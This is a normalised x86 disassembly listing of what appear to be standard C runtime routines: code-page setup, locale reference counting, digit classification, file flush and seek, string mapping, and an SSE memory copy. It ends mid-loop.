call sub_423ef8
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
sub_41f3c3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_41f401
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_41f3c3
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_41f42a
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_41f459
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_412f80
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_41f4bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_424508
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_424309
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_424309
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_412f80
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_41f650
push 0xc
push r--data
call sub_4183f0
call sub_41807a
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f6eb
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_418435
retn
push 0x20
call sub_416f1d
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_4121b5
pop ecx
sub_41f6f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_415547
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41f770
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_41f6f4
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_41f459
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_412f80
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_41f42a
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_41f4bd
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_412f80
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_41f42a
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_41f955
push 0x14
push r--data
call sub_4183f0
or [ ebp - 0x20 ] 0xffffffff
call sub_41807a
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_41f650
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_41f6f4
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_418672
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_418435
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_41f770
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_4121b5
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_4121b5
pop ecx
push 0xd
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41fab6
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_4121b5
pop ecx
sub_41fb0d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4121b5
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4121b5
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4121b5
push [ esi + 0xc0 ]
call sub_4121b5
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_42454a
push [ edi ]
call sub_4121b5
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_4121b5
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4121b5
pop ecx
push [ esi + 0xb0 ]
call sub_4121b5
push [ esi + 0xbc ]
call sub_4121b5
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4121b5
push [ esi + 0xbc ]
call sub_424724
pop ecx
pop ecx
push eax
call sub_4121b5
pop ecx
push eax
call sub_4121b5
push [ esi + 0xbc ]
call sub_4246df
pop ecx
pop ecx
sub_41fc56
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_41fce5
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_41fd7e
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_41fc56
pop ecx
test esi esi
je r-xdata
push esi
call sub_41fce5
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_41fb0d
pop ecx
sub_41fdbc
push 0xc
push r--data
call sub_4183f0
call sub_41807a
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_41fd7e
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41fe26
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41807a
mov esi [ eax + 0x6c ]
mov eax esi
call sub_418435
retn
push 0x20
call sub_416f1d
pop ecx
sub_41fe32
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jae r-xdata
cmp ax 0x3a
jae r-xdata
mov eax 0xffffffff
pop ebp
retn
mov ecx 0xff10
mov edx ecx
cmp ax dx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
mov edx ecx
cmp ax dx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
add edx 0xa
cmp ax dx
jae r-xdata
mov ecx 0x6f0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x966
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x9e6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xa66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xae6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xb66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xc66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xce6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xd66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xe50
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xed0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x50
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0xf2a
cmp ax dx
jb r-xdata
mov ecx 0x1040
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x17e0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x30
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0x181a
jmp r-xdata
cmp ax dx
jb r-xdata
sub_42000d
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_415547
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_424826
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_420097
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_415547
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_422128
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_424508
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42014f
push 0x10
push r--data
call sub_4183f0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119bb
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_41b5ae
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420226
mov eax [ ebp - 0x1c ]
call sub_4119ce
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_420230
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
cmp edx edi
je r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
mov esi [ ebp + 0x10 ]
cmp esi edi
jne r-xdata
mov ecx edx
xor eax eax
mov [ edx ] ax
jmp r-xdata
xor eax eax
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edx ] ax
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
inc ecx
inc ecx
inc esi
inc esi
cmp ax di
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
mov eax esi
sub_42029f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_4202f6
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_42034c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_41b5ae
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_4119bb
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_4119e1
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_4203d1
push 0x14
push r--data
call sub_4183f0
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42034c
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4204e0
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_4204ea
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
